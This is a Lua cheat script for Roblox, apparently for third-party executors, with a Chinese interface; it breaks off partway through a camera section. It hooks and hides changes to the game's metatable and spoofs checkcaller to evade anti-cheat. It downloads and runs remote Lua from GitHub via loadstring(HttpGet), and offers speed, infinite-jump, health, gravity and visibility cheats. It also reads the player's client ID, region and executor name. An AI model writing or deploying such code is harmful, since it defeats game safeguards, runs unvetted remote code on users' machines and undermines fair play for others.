local startTime = tick()  

local run = function(func) func() end

run(function()
    _G.MetatableConfig = {
        playersService = game:GetService("Players"),
        mt = getrawmetatable(game),
        oldIndex = nil,
        oldNamecall = nil
    }
end)

run(function()
    local config = _G.MetatableConfig
    local mt = config.mt
    local oldIndex = mt.__index
    
    setreadonly(mt, false)
    
    mt.__index = function(s, k)
        if s == game and k == "Players" then
            return config.playersService
        end
        if type(oldIndex) == "table" then
            return oldIndex[k]
        elseif type(oldIndex) == "function" then
            return oldIndex(s, k)
        end
    end
    
    setreadonly(mt, true)
end)

run(function()
    local config = _G.MetatableConfig
    local mt = config.mt
    local oldNamecall = mt.__namecall
    
    setreadonly(mt, false)
    
    mt.__namecall = function(self, ...)
        local method = getnamecallmethod()
        
        if method == "FireServer" then
        end
        
        if type(oldNamecall) == "function" then
            return oldNamecall(self, ...)
        elseif type(oldNamecall) == "table" then
            return oldNamecall[method](self, ...)
        end
    end
    
    setreadonly(mt, true)
end)

run(function()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    
    local oldNamecall = mt.__namecall
    mt.__namecall = function(self, ...)
        local method = getnamecallmethod()
        
        if method == "checkcaller" then
            return false  
        end
        
        return oldNamecall(self, ...)
    end
    
    if checkcaller then
        _G.checkcaller = function() return false end
    end
    
    setreadonly(mt, true)
end)

run(function()
    local original_getrawmetatable = getrawmetatable
    local clean_mt = getrawmetatable(game)  
    
    getrawmetatable = function(obj)
        if obj == game then
            return clean_mt  
        end
        return original_getrawmetatable(obj)
    end
end)

local XPHUBNotification = loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/refs/heads/main/Roblox-Pi-Script-Notification.lua"))()

XPHUBNotification:Notification({
    Title = "星脚本",
    Text = "欢迎使用星脚本 \n作者: 小星 帮助者: 小皮",
    Icon = "rbxassetid://136169594232359",
    Duration = 4
})
wait(1.5)
XPHUBNotification:Notification({
    Title = "星脚本",
    Text = "星脚本2026.8.8诞生",
    Icon = "rbxassetid://136169594232359",
    Duration = 4
})
wait(1.5)
XPHUBNotification:Notification({
    Title = "星脚本",
    Text = "星脚本是永久免费的禁止倒卖并且持续更新中 更新速度比较缓慢 请见谅",
    Icon = "rbxassetid://136169594232359",
    Duration = 4
})
wait(1.5)
----------------分割线--------------
local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		   wait(1)
		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
--------------分割线--------------------------	
XPHUBNotification:Notification({
    Title = "星脚本",
    Text = "已自动开启防挂机 感谢您使用星脚本 祝您使用愉快 玩的开心",
    Icon = "rbxassetid://136169594232359",
    Duration = 4
})
--------------分割线-----------------------------
--通知
function Notify(top, text, ico, dur)
  game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = top,
    Text = text,
    Icon = ico,
    Duration = dur,
  })
end
--------------分割线-----------------------------
local success, PSU = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/XFFDDD/-/refs/heads/main/Roblox-Xing-Script-UI.lua", true))()
end)

if not success then
    XPHUBNotification:Notification({
        Title = "星脚本",
        Text = "UI加载失败",
        Icon = "rbxassetid://136169594232359",
        Duration = 3
    })
    return
end

local XIAOPI = PSU:new("星脚本")

local PIJIAOBEN = XIAOPI:Tab("信息","136169594232359")

local about = PIJIAOBEN:section("用户信息", true)

local run = function(func) func() end

run(function()
    _G.UserInfoConfig = {
        dataFetched = {
            displayName = false,
            userName = false,
            userId = false,
            clientId = false,
            region = false,
            language = false,
            accountAge = false,
            executor = false,
            gameId = false,
            placeId = false,
            totalPlayers = false,      
            ping = false,             
            fps = false,               
            xpTime = false            
        }
    }
end)

run(function()
    _G.UserInfoServices = {
        Players = game:GetService("Players"),
        LocalPlayer = game:GetService("Players").LocalPlayer,
        RbxAnalyticsService = game:GetService("RbxAnalyticsService"),
        LocalizationService = game:GetService("LocalizationService"),
        RunService = game:GetService("RunService"),   
        Stats = game:GetService("Stats")              
    }
end)

run(function()
    _G.UserInfoLabels = {
        displayName = about:Label("您的用户昵称: 暂无数据"),
        userName = about:Label("您的用户名: 暂无数据"),
        userId = about:Label("您的用户ID: 暂无数据"),
        clientId = about:Label("您的客户端ID: 暂无数据"),
        region = about:Label("您的地区: 暂无数据"),
        language = about:Label("您的语言: 暂无数据"),
        accountAgeDays = about:Label("您的账户年龄(天): 暂无数据"),
        accountAgeYears = about:Label("您的账户年龄(年): 暂无数据"),
        executor = about:Label("您使用的注入器: 暂无数据"),
        gameId = about:Label("您当前服务器的ID: 暂无数据"),
        placeId = about:Label("您当前的服务器位置ID: 暂无数据"),
        totalPlayers = about:Label("当前服务器总人数: 0"),     
        ping = about:Label("您的Ping: 0"),                   
        fps = about:Label("您的FPS: 0"),                     
        xpTime = about:Label("XP时间: 00:00:00")               
    }
end)

run(function()
    local Players = _G.UserInfoServices.Players
    local LocalPlayer = _G.UserInfoServices.LocalPlayer
    local RbxAnalyticsService = _G.UserInfoServices.RbxAnalyticsService
    local LocalizationService = _G.UserInfoServices.LocalizationService
    local RunService = _G.UserInfoServices.RunService
    local Stats = _G.UserInfoServices.Stats
    local labels = _G.UserInfoLabels
    local dataFetched = _G.UserInfoConfig.dataFetched
    
    local function updateTotalPlayerCount()
        local total = #Players:GetPlayers()
        if labels.totalPlayers then
            labels.totalPlayers.Text = "当前服务器总人数: " .. total
        end
        dataFetched.totalPlayers = true
        return total
    end
    
    Players.PlayerAdded:Connect(updateTotalPlayerCount)
    Players.PlayerRemoving:Connect(updateTotalPlayerCount)
    updateTotalPlayerCount()  
    
    local lastTime = os.clock()
    local colors = {
        Color3.fromRGB(255, 0, 0),    
        Color3.fromRGB(255, 127, 0), 
        Color3.fromRGB(255, 255, 0), 
        Color3.fromRGB(0, 255, 0),  
        Color3.fromRGB(0, 0, 255),    
        Color3.fromRGB(75, 0, 130),    
        Color3.fromRGB(148, 0, 211)  
    }
    local colorIndex = 0
    
    RunService.Heartbeat:Connect(function()
        local pingValue = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
        labels.ping.Text = "您的Ping: " .. math.round(pingValue)
        dataFetched.ping = true
        
        local currentTime = os.clock()
        local fpsValue = 1 / (currentTime - lastTime)
        labels.fps.Text = "您的FPS: " .. math.floor(fpsValue)
        lastTime = currentTime
        dataFetched.fps = true
        
        local timeStr = os.date("%H:%M:%S")
        labels.xpTime.Text = "XP时间: " .. timeStr
        colorIndex = (colorIndex + 0.02) % #colors
        local current = math.floor(colorIndex) + 1
        local nextColor = current % #colors + 1
        labels.xpTime.TextColor3 = colors[current]:Lerp(colors[nextColor], colorIndex % 1)
        dataFetched.xpTime = true
    end)
    
    _G.UserInfoUpdater = {
        update = function()
            if not dataFetched.displayName and LocalPlayer.DisplayName then
                labels.displayName.Text = "您的用户昵称: " .. LocalPlayer.DisplayName
                dataFetched.displayName = true
            end
            
            if not dataFetched.userName and LocalPlayer.Character and LocalPlayer.Character.Name then
                labels.userName.Text = "您的用户名: " .. LocalPlayer.Character.Name
                dataFetched.userName = true
            end
            
            if not dataFetched.userId and LocalPlayer.UserId then
                labels.userId.Text = "您的用户ID: " .. LocalPlayer.UserId
                dataFetched.userId = true
            end
            
            if not dataFetched.clientId then
                pcall(function()
                    local clientId = RbxAnalyticsService:GetClientId()
                    if clientId and clientId ~= "" then
                        labels.clientId.Text = "您的客户端ID: " .. clientId
                        dataFetched.clientId = true
                    end
                end)
            end
            
            if not dataFetched.region then
                pcall(function()
                    local region = LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
                    if region and region ~= "" then
                        labels.region.Text = "您的地区: " .. region
                        dataFetched.region = true
                    end
                end)
            end
            
            if not dataFetched.language and LocalPlayer.LocaleId then
                labels.language.Text = "您的语言: " .. LocalPlayer.LocaleId
                dataFetched.language = true
            end
            
            if not dataFetched.accountAge and LocalPlayer.AccountAge then
                labels.accountAgeDays.Text = "您的账户年龄(天): " .. LocalPlayer.AccountAge
                local years = math.floor(LocalPlayer.AccountAge / 365 * 100) / 100
                labels.accountAgeYears.Text = "您的账户年龄(年): " .. years
                dataFetched.accountAge = true
            end
            
            if not dataFetched.executor then
                pcall(function()
                    local executor = identifyexecutor()
                    if executor and executor ~= "" then
                        labels.executor.Text = "您使用的注入器: " .. executor
                        dataFetched.executor = true
                    end
                end)
            end
            
            if not dataFetched.gameId and game.GameId then
                labels.gameId.Text = "您当前服务器的ID: " .. game.GameId
                dataFetched.gameId = true
            end
            
            if not dataFetched.placeId and game.PlaceId then
                labels.placeId.Text = "您当前的服务器位置ID: " .. game.PlaceId
                dataFetched.placeId = true
            end
            
        end,
        
        allDataFetched = function()
            for _, fetched in pairs(dataFetched) do
                if not fetched then
                    return false
                end
            end
            return true
        end
    }
end)

run(function()
    _G.UserInfoUpdater.update()
end)

run(function()
    local LocalPlayer = _G.UserInfoServices.LocalPlayer
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(0.5)
        _G.UserInfoUpdater.update()
    end)
end)

run(function()
    spawn(function()
        while not _G.UserInfoUpdater.allDataFetched() do
            task.wait(15)
            _G.UserInfoUpdater.update()
        end
    end)
end)

local run = function(func) func() end

run(function()
    _G.UserDisplayConfig = {
        enabled = false,
        userGui = nil
    }
end)

run(function()
    _G.UserDisplayServices = {
        Players = game:GetService("Players"),
        TweenService = game:GetService("TweenService"),
        RunService = game:GetService("RunService"),
        CoreGui = game:GetService("CoreGui"),
        LocalPlayer = game:GetService("Players").LocalPlayer
    }
end)

run(function()
    local TweenService = _G.UserDisplayServices.TweenService
    local CoreGui = _G.UserDisplayServices.CoreGui
    local LocalPlayer = _G.UserDisplayServices.LocalPlayer
    
    _G.UserDisplayModule = {
        create = function()
            if _G.UserDisplayConfig.userGui then
                _G.UserDisplayConfig.userGui:Destroy()
            end
            
            local userGui = Instance.new("ScreenGui")
            userGui.Name = "UserGui"
            userGui.Parent = CoreGui
            userGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            
            local userLabel = Instance.new("TextLabel")
            userLabel.Name = "UserLabel"
            userLabel.Parent = userGui
            userLabel.BackgroundTransparency = 1
            userLabel.Position = UDim2.new(0.80, 0.80, 0.00090, 0)
            userLabel.Size = UDim2.new(0, 135, 0, 50)
            userLabel.Font = Enum.Font.GothamSemibold
            userLabel.Text = "尊贵的星脚本用户: " .. LocalPlayer.DisplayName
            userLabel.TextColor3 = Color3.new(1, 1, 1)
            userLabel.TextSize = 25
            userLabel.TextWrapped = true
            
            local uiGradient = Instance.new("UIGradient")
            uiGradient.Color = ColorSequence.new{
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 0)),
                ColorSequenceKeypoint.new(0.10, Color3.fromRGB(255, 127, 0)),
                ColorSequenceKeypoint.new(0.20, Color3.fromRGB(255, 255, 0)),
                ColorSequenceKeypoint.new(0.30, Color3.fromRGB(0, 255, 0)),
                ColorSequenceKeypoint.new(0.40, Color3.fromRGB(0, 255, 255)),
                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(0, 0, 255)),
                ColorSequenceKeypoint.new(0.60, Color3.fromRGB(139, 0, 255)),
                ColorSequenceKeypoint.new(0.70, Color3.fromRGB(255, 0, 0)),
                ColorSequenceKeypoint.new(0.80, Color3.fromRGB(255, 127, 0)),
                ColorSequenceKeypoint.new(0.90, Color3.fromRGB(255, 255, 0)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 255, 0))
            }
            uiGradient.Rotation = 10
            uiGradient.Parent = userLabel
            
            local tweenInfo = TweenInfo.new(7, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
            local tween = TweenService:Create(uiGradient, tweenInfo, {Rotation = 360})
            tween:Play()
            
            _G.UserDisplayConfig.userGui = userGui
        end,
        
        destroy = function()
            if _G.UserDisplayConfig.userGui then
                _G.UserDisplayConfig.userGui:Destroy()
                _G.UserDisplayConfig.userGui = nil
            end
        end
    }
end)

run(function()
    about:Toggle("开启/关闭星脚本用户名称显示", "", false, function(state)
        _G.UserDisplayConfig.enabled = state
        
        if state then
            _G.UserDisplayModule.create()
        else
            _G.UserDisplayModule.destroy()
        end
    end)
end)

run(function()
    local Players = _G.UserDisplayServices.Players
    local LocalPlayer = Players.LocalPlayer
    
    LocalPlayer.CharacterAdded:Connect(function()
        if _G.UserDisplayConfig and _G.UserDisplayConfig.enabled then
            task.wait(0.5)
            _G.UserDisplayModule.destroy()
            _G.UserDisplayModule.create()
        end
    end)
end)

local about = PIJIAOBEN:section("作者信息",true)

about:Label("星脚本")
about:Label("永不跑路的脚本")
about:Label("作者: 小星")
about:Label("作者QQ: 2332507600")
about:Label("星脚本恩师: 小皮")
about:Label("星脚本QQ主群: 645313702")
about:Button("复制作者QQ", function()
    setclipboard("2332507600")
end)

local selectedItem = nil
local itemsMap = {
    ["皮脚本QQ主群"] = "1065725086",
    ["皮脚本二周年晚会群"] = "753828002",
    ["星脚本QQ主群"] = "645313702",
}

about:Dropdown("选择群号/链接", "ItemSelector", {
    "皮脚本QQ主群",
    "皮脚本二周年晚会群",
    "星脚本QQ主群",
}, function(selected)
    selectedItem = selected
end)

about:Button("复制群号/链接", function()
    if selectedItem then
        local content = itemsMap[selectedItem]
        if content then
            setclipboard(content)
        end
    end
end)

local about = PIJIAOBEN:section("最大帮助者",true)

about:Label("万分感谢小皮师傅对我的支持与帮助")
about:Label("给我提供了许多的功能源码")
about:Label("谢谢您的支持与帮助^ω^")

local XP = PIJIAOBEN:section("UI设置", true)

XP:Button("关闭脚本UI",function()
            game:GetService("CoreGui")["XPXPXPNBNB"]:Destroy()
end)

XP:Keybind("切换用户界面", Enum.KeyCode.Home, function(Value)
            ToggleUILib()
end)     

local PIJIAOBEN = XIAOPI:Tab("本地玩家","136169594232359")

local about = PIJIAOBEN:section("速度", false)

local run = function(func) func() end

run(function()
    _G.MoveSpeed = {
        Enabled = false,
        Speed = 16,
        Mode = "WalkSpeed",  
        Connection = nil
    }
    
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
    
    local function getCharacter()
        if LocalPlayer and LocalPlayer.Character then
            return LocalPlayer.Character
        end
        return nil
    end
    
    local function getHumanoid()
        local char = getCharacter()
        if char then
            return char:FindFirstChildOfClass("Humanoid")
        end
        return nil
    end
    
    local function getRootPart()
        local char = getCharacter()
        if char then
            return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
        end
        return nil
    end
    
    local function walkSpeedMode(speed)
        local humanoid = getHumanoid()
        if humanoid then
            humanoid.WalkSpeed = speed
        end
    end
    
    local function cframeMove(speed)
        local humanoid = getHumanoid()
        local rootPart = getRootPart()
        
        if not humanoid or not rootPart then return end
        
        local moveDirection = humanoid.MoveDirection
        if moveDirection.Magnitude > 0 then
            rootPart.CFrame = rootPart.CFrame + (moveDirection * speed * 0.1)
        end
    end
    
    local function velocityMove(speed)
        local humanoid = getHumanoid()
        local rootPart = getRootPart()
        
        if not humanoid or not rootPart then return end
        
        local moveDirection = humanoid.MoveDirection
        if moveDirection.Magnitude > 0 then
            rootPart.Velocity = Vector3.new(
                moveDirection.X * speed,
                rootPart.Velocity.Y,
                moveDirection.Z * speed
            )
        end
    end
    
    local function translateMove(speed)
        local humanoid = getHumanoid()
        local rootPart = getRootPart()
        
        if not humanoid or not rootPart then return end
        
        local moveDirection = humanoid.MoveDirection
        if moveDirection.Magnitude > 0 then
            rootPart.CFrame = rootPart.CFrame + (moveDirection * speed * 0.1)
        end
    end
    
    local function startMoveLoop()
        if _G.MoveSpeed.Connection then
            _G.MoveSpeed.Connection:Disconnect()
        end
        
        _G.MoveSpeed.Connection = RunService.Heartbeat:Connect(function()
            if not _G.MoveSpeed.Enabled then return end
            
            local humanoid = getHumanoid()
            local rootPart = getRootPart()
            
            if not humanoid or not rootPart then return end
            if humanoid.Health <= 0 then return end
            
            if _G.MoveSpeed.Mode == "WalkSpeed" then
                walkSpeedMode(_G.MoveSpeed.Speed)
            elseif _G.MoveSpeed.Mode == "CFrame" then
                cframeMove(_G.MoveSpeed.Speed)
            elseif _G.MoveSpeed.Mode == "Velocity" then
                velocityMove(_G.MoveSpeed.Speed)
            elseif _G.MoveSpeed.Mode == "Translate" then
                translateMove(_G.MoveSpeed.Speed)
            end
        end)
    end
    
    local function stopMoveLoop()
        if _G.MoveSpeed.Connection then
            _G.MoveSpeed.Connection:Disconnect()
            _G.MoveSpeed.Connection = nil
        end
        
        local humanoid = getHumanoid()
        if humanoid then
            humanoid.WalkSpeed = 16
        end
    end
    
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        if _G.MoveSpeed.Enabled then
            stopMoveLoop()
            startMoveLoop()
        end
    end)
    
    _G.MoveSpeedFunctions = {
        start = startMoveLoop,
        stop = stopMoveLoop
    }
end)

run(function()    
    about:Dropdown("移动模式", "Move Mode", {
        "WalkSpeed",
        "CFrame",
        "Velocity",
        "Translate"
    }, function(Value)
        _G.MoveSpeed.Mode = Value
        
        if _G.MoveSpeed.Enabled then
            _G.MoveSpeedFunctions.stop()
            _G.MoveSpeedFunctions.start()
        end
    end)
    
    about:Slider("设置速度", "Move Speed Slider", 16, 1, 600, false, function(Value)
        _G.MoveSpeed.Speed = Value
    end)
    
    about:Textbox("设置速度", "Move Speed Input", "输入速度", function(Value)
        local speed = tonumber(Value)
        if speed then
            _G.MoveSpeed.Speed = speed
        end
    end)
    
    about:Toggle("开启/关闭移动速度", "MoveSpeed Enabled", false, function(Value)
        _G.MoveSpeed.Enabled = Value
        if Value then
            _G.MoveSpeedFunctions.start()
        else
            _G.MoveSpeedFunctions.stop()
        end
    end)
end)

local about = PIJIAOBEN:section("跳跃", false)

local run = function(func) func() end

run(function()
    _G.Jump = {
        Enabled = false,
        JumpPower = 50,
        Mode = "Humanoid",
        Multiplier = 1,
        InfJ = false,
        Connection = nil,
        InfJConnection = nil,
        JumpRequestConnection = nil
    }
    
    local Players = game:GetService("Players")
    local UserInputService = game:GetService("UserInputService")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
    
    local function getCharacter()
        if LocalPlayer and LocalPlayer.Character then
            return LocalPlayer.Character
        end
        return nil
    end
    
    local function getHumanoid()
        local char = getCharacter()
        if char then
            return char:FindFirstChildOfClass("Humanoid")
        end
        return nil
    end
    
    local function getRootPart()
        local char = getCharacter()
        if char then
            return char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
        end
        return nil
    end
    
    local function checkGrounded()
        local humanoid = getHumanoid()
        if humanoid then
            return humanoid:GetState() == Enum.HumanoidStateType.Landed or 
                   humanoid:GetState() == Enum.HumanoidStateType.Running or
                   humanoid:GetState() == Enum.HumanoidStateType.Walking
        end
        return false
    end
    
    local function humanoidJump(power, multiplier)
        local humanoid = getHumanoid()
        if humanoid then
            humanoid.JumpPower = power * multiplier
        end
    end
    
    local function performJump()
        local humanoid = getHumanoid()
        local rootPart = getRootPart()
        
        if not humanoid or not rootPart or humanoid.Health <= 0 then return end
        
        if _G.Jump.Mode == "Humanoid" then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            
        elseif _G.Jump.Mode == "CFrame" then
            local jumpHeight = _G.Jump.JumpPower * _G.Jump.Multiplier * 0.1
            rootPart.CFrame = rootPart.CFrame + Vector3.new(0, jumpHeight, 0)
            
        elseif _G.Jump.Mode == "Velocity" then
            rootPart.Velocity = Vector3.new(rootPart.Velocity.X, _G.Jump.JumpPower * _G.Jump.Multiplier * 1.5, rootPart.Velocity.Z)
            
        elseif _G.Jump.Mode == "Infinite" then
            rootPart.Velocity = Vector3.new(rootPart.Velocity.X, _G.Jump.JumpPower * _G.Jump.Multiplier * 1.5, rootPart.Velocity.Z)
        end
    end
    
    local function setupJumpRequest()
        if _G.Jump.JumpRequestConnection then
            _G.Jump.JumpRequestConnection:Disconnect()
            _G.Jump.JumpRequestConnection = nil
        end
        
        if not _G.Jump.Enabled then return end
        
        _G.Jump.JumpRequestConnection = UserInputService.JumpRequest:Connect(function()
            if not _G.Jump.Enabled then return end
            
            local humanoid = getHumanoid()
            if not humanoid or humanoid.Health <= 0 then return end
            
            if not _G.Jump.InfJ and _G.Jump.Mode ~= "Infinite" then
                if not checkGrounded() then return end
            end
            
            performJump()
        end)
    end
    
    local function setupInfiniteJump()
        if _G.Jump.InfJConnection then
            _G.Jump.InfJConnection:Disconnect()
            _G.Jump.InfJConnection = nil
        end
        
        if not _G.Jump.InfJ or not _G.Jump.Enabled then return end
    end
    
    local function startJumpLoop()
        if _G.Jump.Connection then
            _G.Jump.Connection:Disconnect()
            _G.Jump.Connection = nil
        end
        
        if not _G.Jump.Enabled then return end
        
        setupJumpRequest()
        
        _G.Jump.Connection = RunService.Heartbeat:Connect(function()
            if not _G.Jump.Enabled then return end
            
            local humanoid = getHumanoid()
            
            if not humanoid then return end
            if humanoid.Health <= 0 then return end
            
            if _G.Jump.Mode == "Humanoid" then
                humanoidJump(_G.Jump.JumpPower, _G.Jump.Multiplier)
            end
        end)
    end
    
    local function stopJumpLoop()
        if _G.Jump.Connection then
            _G.Jump.Connection:Disconnect()
            _G.Jump.Connection = nil
        end
        
        if _G.Jump.InfJConnection then
            _G.Jump.InfJConnection:Disconnect()
            _G.Jump.InfJConnection = nil
        end
        
        if _G.Jump.JumpRequestConnection then
            _G.Jump.JumpRequestConnection:Disconnect()
            _G.Jump.JumpRequestConnection = nil
        end
        
        local humanoid = getHumanoid()
        if humanoid then
            humanoid.JumpPower = 50
        end
    end
    
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        if _G.Jump.Enabled then
            stopJumpLoop()
            startJumpLoop()
        end
    end)
    
    _G.JumpFunctions = {
        start = startJumpLoop,
        stop = stopJumpLoop,
        updateInfJ = setupInfiniteJump,
        updateJumpRequest = setupJumpRequest
    }
end)

run(function() 
    about:Toggle("开启/关闭跳跃", "Jump Enabled", false, function(Value)
        _G.Jump.Enabled = Value
        if Value then
            _G.JumpFunctions.start()
        else
            _G.JumpFunctions.stop()
        end
    end)
    
    about:Dropdown("跳跃模式", "Jump Mode", {
        "Humanoid",
        "CFrame",
        "Velocity",
        "Infinite"
    }, function(Value)
        _G.Jump.Mode = Value
        
        if _G.Jump.Enabled then
            _G.JumpFunctions.stop()
            _G.JumpFunctions.start()
        end
    end)
    
    about:Slider("设置跳跃高度", "Jump Power", 50, 50, 400, false, function(Value)
        _G.Jump.JumpPower = Value
    end)
    
    about:Textbox("设置跳跃倍数", "Jump Multiplier", "输入倍数", function(Value)
        local multiplier = tonumber(Value)
        if multiplier and multiplier > 0 then
            _G.Jump.Multiplier = multiplier
        end
    end)
    
    about:Toggle("无限跳跃", "Inf Jump", false, function(Value)
        _G.Jump.InfJ = Value
    end)
end)

local about = PIJIAOBEN:section("血量", false)

local run = function(func) func() end

run(function()
    _G.Health = {
        Enabled = false,
        MaxHealthEnabled = false,
        Health = 100,
        MaxHealth = 100,
        Connection = nil
    }
    
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local LocalPlayer = Players.LocalPlayer
    
    local function getCharacter()
        if LocalPlayer and LocalPlayer.Character then
            return LocalPlayer.Character
        end
        return nil
    end
    
    local function getHumanoid()
        local char = getCharacter()
        if char then
            return char:FindFirstChildOfClass("Humanoid")
        end
        return nil
    end
    
    local function setHealth(value)
        local humanoid = getHumanoid()
        if humanoid then
            humanoid.Health = value
        end
    end
    
    local function setMaxHealth(value)
        local humanoid = getHumanoid()
        if humanoid then
            humanoid.MaxHealth = value
        end
    end
    
    local function startLoop()
        if _G.Health.Connection then
            _G.Health.Connection:Disconnect()
        end
        
        _G.Health.Connection = RunService.Heartbeat:Connect(function()
            local humanoid = getHumanoid()
            if not humanoid then return end
            if humanoid.Health <= 0 then return end
            
            if _G.Health.MaxHealthEnabled then
                setMaxHealth(_G.Health.MaxHealth)
            end
            
            if _G.Health.Enabled then
                setHealth(_G.Health.Health)
            end
        end)
    end
    
    local function stopLoop()
        if _G.Health.Connection then
            _G.Health.Connection:Disconnect()
            _G.Health.Connection = nil
        end
    end
    
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        if _G.Health.Enabled or _G.Health.MaxHealthEnabled then
            stopLoop()
            startLoop()
        end
    end)
    
    _G.HealthFunctions = {
        start = startLoop,
        stop = stopLoop
    }
end)

run(function()
    about:Toggle("开启/关闭血量", "Health Enabled", false, function(Value)
        _G.Health.Enabled = Value
        if _G.Health.Enabled or _G.Health.MaxHealthEnabled then
            _G.HealthFunctions.start()
        else
            _G.HealthFunctions.stop()
        end
    end)
    
    about:Slider("设置血量", "Health Slider", 100, 100, 10000, false, function(Value)
        _G.Health.Health = Value
    end)
    
    about:Textbox("设置血量", "Health Input", "输入血量值", function(Value)
        local health = tonumber(Value)
        if health then
            _G.Health.Health = health
        end
    end)
    
    about:Toggle("开启/关闭血量上限", "MaxHealth Enabled", false, function(Value)
        _G.Health.MaxHealthEnabled = Value
        if _G.Health.Enabled or _G.Health.MaxHealthEnabled then
            _G.HealthFunctions.start()
        else
            _G.HealthFunctions.stop()
        end
    end)
    
    about:Slider("设置血量上限", "MaxHealth Slider", 100, 100, 10000, false, function(Value)
        _G.Health.MaxHealth = Value
    end)
    
    about:Textbox("设置血量上限", "MaxHealth Input", "输入血量上限值", function(Value)
        local maxHealth = tonumber(Value)
        if maxHealth then
            _G.Health.MaxHealth = maxHealth
        end
    end)
end)

local about = PIJIAOBEN:section("高度", false)

local heightConfig = {
    currentHeight = 2,
    originalHeight = 2,  
    enabled = false
}

local function applyHeight()
    local char = game.Players.LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") then
        char.Humanoid.HipHeight = heightConfig.enabled and heightConfig.currentHeight or heightConfig.originalHeight
    end
end

local function initOriginalHeight()
    local char = game.Players.LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") then
        heightConfig.originalHeight = char.Humanoid.HipHeight
    end
end

initOriginalHeight()

game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
    char:WaitForChild("Humanoid")
    heightConfig.originalHeight = char.Humanoid.HipHeight
    applyHeight()
end)

about:Textbox("设置高度", tostring(heightConfig.currentHeight), "输入", function(value)
    heightConfig.currentHeight = tonumber(value) or heightConfig.currentHeight
    if heightConfig.enabled then applyHeight() end
end)

about:Toggle("开启/关闭修改高度", "", false, function(state)
    heightConfig.enabled = state
    applyHeight()
end)

local about = PIJIAOBEN:section("重力", false)

local run = function(func) func() end

run(function()
    _G.Gravity = {
        Enabled = false,
        NoGravity = false,
        CurrentGravity = 196.2,
        LoopConnection = nil
    }
    
    local Players = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local Workspace = game:GetService("Workspace")
    local LocalPlayer = Players.LocalPlayer
    
    local function applyGravity()
        if not _G.Gravity.Enabled then return end
        
        if _G.Gravity.NoGravity then
            Workspace.Gravity = 0
        else
            Workspace.Gravity = _G.Gravity.CurrentGravity
        end
    end
    
    local function resetGravity()
        Workspace.Gravity = 196.2
    end
    
    local function startLoop()
        if _G.Gravity.LoopConnection then
            _G.Gravity.LoopConnection:Disconnect()
        end
        
        _G.Gravity.LoopConnection = RunService.Heartbeat:Connect(function()
            applyGravity()
        end)
    end
    
    local function stopLoop()
        if _G.Gravity.LoopConnection then
            _G.Gravity.LoopConnection:Disconnect()
            _G.Gravity.LoopConnection = nil
        end
        resetGravity()
    end
    
    _G.GravityFunctions = {
        apply = applyGravity,
        reset = resetGravity,
        start = startLoop,
        stop = stopLoop
    }
end)

run(function()
    about:Toggle("开启/关闭修改重力", "Gravity Enabled", false, function(state)
        _G.Gravity.Enabled = state
        if state then
            _G.GravityFunctions.apply()
            _G.GravityFunctions.start()
        else
            _G.GravityFunctions.stop()
        end
    end)

    about:Slider("设置重力值", "Gravity Slider", 196.2, 0, 1000, false, function(Value)
        _G.Gravity.CurrentGravity = tonumber(Value) or _G.Gravity.CurrentGravity
        if _G.Gravity.Enabled and not _G.Gravity.NoGravity then
            _G.GravityFunctions.apply()
        end
    end)
end)
    
    about:Toggle("无重力模式", "No Gravity", false, function(Value)
        _G.Gravity.NoGravity = Value
        if _G.Gravity.Enabled then
            _G.GravityFunctions.apply()
        end
    end)
    
local about = PIJIAOBEN:section("亮度", false)

local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")

local NightVision = {
    Active = false,
    Brightness = 1,
    UpdateInterval = 0.2,
    OriginalSettings = {
        Ambient = Lighting.Ambient,
        OutdoorAmbient = Lighting.OutdoorAmbient,
        Brightness = Lighting.Brightness,
        ClockTime = Lighting.ClockTime
    },
    Connection = nil
}

about:Slider("设置夜视亮度", "NV_Brightness", 1, 1, 30, false, function(Value)
    NightVision.Brightness = Value
    if NightVision.Active then
        Lighting.Brightness = Value
    end
end)

about:Toggle("开启/关闭夜视", "NV_Toggle", false, function(Enabled)
    if NightVision.Connection then
        NightVision.Connection:Disconnect()
        NightVision.Connection = nil
    end

    NightVision.Active = Enabled

    if Enabled then
        Lighting.Ambient = Color3.new(1, 1, 1)
        Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
        Lighting.Brightness = NightVision.Brightness
        Lighting.ClockTime = 12

        NightVision.Connection = RunService.Heartbeat:Connect(function()
            Lighting.Ambient = Color3.new(1, 1, 1)
            Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
            Lighting.Brightness = NightVision.Brightness
        end)
    else
        for setting, value in pairs(NightVision.OriginalSettings) do
            Lighting[setting] = value
        end
    end
end)

local about = PIJIAOBEN:section("相机", false)

local run = function(func) func() end

run(function()
    _G.Camera = {
        ZoomEnabled = false,
        FOVEnabled = false,
        ZoomDistance = 128,
